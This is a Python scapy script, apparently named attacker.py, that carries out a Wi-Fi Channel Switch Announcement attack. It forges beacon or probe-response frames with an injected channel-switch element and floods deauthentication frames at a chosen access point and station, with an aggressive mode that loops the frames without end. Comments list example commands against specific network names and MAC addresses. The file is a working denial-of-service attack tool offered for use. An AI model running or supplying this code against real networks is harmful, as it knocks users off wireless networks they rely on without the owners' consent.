from scapy.all import *
import time
import sys
import argparse
import re
import threading

parser = None
#conf.verb=0
#핸드폰의 경우 유니캐스트로 연결을 끊는것은 불가능함
#python3 attacker.py -i mon0 -a 24:4b:fe:ac:1e:f0 -v KITRI_DEV2.4 -c 13 -d broadcast =>  확인완료
#python3 attacker.py -i mon0 -a 24:4b:fe:ac:1e:f4 -v KITRI_DEV5 -c 100 -d broadcast
#python3 attacker.py -i mon0 -a 24:4b:fe:ac:1e:f0 -s 2c:6d:c1:32:90:ba -v KITRI_DEV2.4 -c 13 -d unicast --aggressive True => 밥트북 빼고 확인 완료
#python3 attacker.py -i mon0 -a 24:4b:fe:ac:1e:f4 -s 2c:6d:c1:32:90:ba -v KITRI_DEV5 -c 13 -d unicast --aggressive True
def csa_attack(parser):
	#Broadcast CSA Attack
	if is_broadcast(parser):
		sniff(iface=parser.interface, stop_filter = stop_filter_beacon)

	#ProbeResponse CSA Attack
	else:
		#sniff(iface=parser.interface, stop_filter = stop_filter_probe)
		dot11 = Dot11(type=0, subtype=5, addr1=parser.sta, addr2=parser.ap, addr3=parser.ap)
		probe_resp = Dot11ProbeResp(cap=0x1111)
		essid = Dot11Elt(ID='SSID', info=parser.ssid, len=len(parser.ssid))
		ds_param = Dot11EltDSSSet(ID=0x3, len=1, channel=parser.channel)
		csa = Dot11Elt(ID=0x25,len=3,info='\x01\x24\x01')
		probeRespFrame = RadioTap()/dot11/probe_resp/essid/ds_param/csa

		dot11_deauth = Dot11(type=0, subtype=0xc, addr1=parser.sta, addr2=parser.ap, addr3=parser.ap)
		deauth = Dot11Deauth(reason=7)
		deauthFrame = RadioTap()/dot11_deauth/deauth
		print("csa packet")
		hexdump(probeRespFrame)
		print("deauth packet")
		hexdump(deauthFrame)
		
		t = threading.Thread(target=send_deauth,args=(parser, deauthFrame))
		t.start()

		if parser.aggressive == True:
			sendp(probeRespFrame, iface=parser.interface, inter=0.004, loop=1)
		else:
			sendp(probeRespFrame, iface=parser.interface, count=6)

def send_deauth(parser, deauth_frame):
	if parser.aggressive == True:
		sendp(deauth_frame, iface=parser.interface, inter=0.004, loop=1)
	else:
		sendp(deauth_frame, iface=parser.interface, count=6)

def is_broadcast(parser):
	if parser.casting == "broadcast":
		return True
	else:
		return False

def stop_filter_beacon(packet):
	if packet.haslayer(Dot11Beacon):
		elt = packet.getlayer(Dot11Elt)
		dot11 = packet.getlayer(Dot11)
		beacon = packet.getlayer(Dot11Beacon)
		flag = False
		if dot11.addr3 == parser.ap:
			print("original packet")
			hexdump(packet)
			dot11_beacon = Dot11(type=0, subtype=8, addr1='ff:ff:ff:ff:ff:ff', addr2=parser.ap, addr3=parser.ap)
			beacon = Dot11Beacon(cap=0o411)
			frame = RadioTap()/dot11_beacon/beacon
			csa = Dot11Elt(ID=0x25,len=3,info='\x01\x24\x01')

			while elt != None:
				if elt.ID > 37 and flag == False:
					flag = True
					frame = frame/csa
				information_element = Dot11Elt(ID=elt.ID, len=elt.len, info=elt.info)
				frame = frame/information_element
				elt = elt.payload.getlayer(Dot11Elt)

			print("csa packet")
			hexdump(frame)

			if parser.aggressive == True:
				sendp(frame, iface=parser.interface, inter=0.004, loop=1)	
			else:
				sendp(frame, iface=parser.interface, count = 6)
			return True
			
	return False


def stop_filter_probe(packet):
	return False

class PARSER:
	def __init__(self, opts):
		self.help = self.help(opts.help)
		self.interface = self.interface(opts.interface)
		self.channel = self.channel(opts.channel)
		self.ap = self.mac(opts.ap)
		self.ssid = opts.ssid
		self.casting = self.cast(opts.cast)

		if self.casting == "unicast":
			self.sta = self.mac(opts.sta)

		
		self.aggressive = opts.aggressive
	
	def help(self, _help):
		if _help:
			print("HELPPPPPP")

	def mac(self, mac_address):
		if mac_address == None:
			print("No MAC address Given")
			exit(-1)
	
		if re.search(r"^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$", mac_address):
			return mac_address.lower()
		else:
			print("Invalid MAC Address Given")
			exit(-1)

	def channel(self, ch):
		retval = list(range(1,164))
		if ch:
			if ch in retval:
				return ch
			else:
				print("Invalid Channel Given.")
		else:
			print("No Channel Given")
			exit(-1)
	
	def interface(self, iface):
		def getNICnames():
			ifaces = []
			dev = open('/proc/net/dev', 'r')
			data = dev.read()
			for n in re.findall('[a-zA-Z0-9]+:', data):
				ifaces.append(n.rstrip(":"))
			return ifaces

		def confirmMon(iface):
			co = subprocess.Popen(['iwconfig', iface], stdout=subprocess.PIPE)
			data = co.communicate()[0].decode()
			card = re.findall('Mode:[A-Za-z]+', data)[0]	
			if "Monitor" in card:
				return True
			else:
				return False

		if iface:
			ifaces = getNICnames()
			if iface in ifaces:
				if confirmMon(iface):
					return iface
				else:
					print("Interface Not In Monitor Mode [%s]" % (iface))
					exit(-1)
			else:
				print("Interface Not Found. [%s]" % (iface))
				exit(-1)
		else:
			print("Interface Not Provided. Specify an Interface!")
			exit(-1)

	def cast(self, casting):
		if casting == "unicast" or casting == "broadcast":
			return casting
		else:
			print("Only unicast or broadcast")
			exit(-1)


if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help=False)

	parser.add_argument('-h', '--help', dest='help', default=False, action="store_true")
	
	parser.add_argument('-i', '--interface', dest='interface', default="", type=str)
	parser.add_argument('-c', '--channel', dest='channel', default=0, type=int)
	parser.add_argument('-a', '--accesspoint', dest='ap', default="", type=str)
	parser.add_argument('-s', '--station', dest='sta', default="", type=str)
	parser.add_argument('-v', '--ssid', dest='ssid', default="", type=str)

	parser.add_argument('-d', '--casting', dest='cast', default="broadcast", type=str)
	
	parser.add_argument('--aggressive', dest='aggressive', default=False, type=bool)

	options = parser.parse_args()
	parser = PARSER(options)
	#print(f"interface: {parser.interface}\nChannel: {parser.channel}\nAP: {parser.ap}\nSSID: {parser.ssid}\ncasting: {parser.casting}")

	csa_attack(parser)
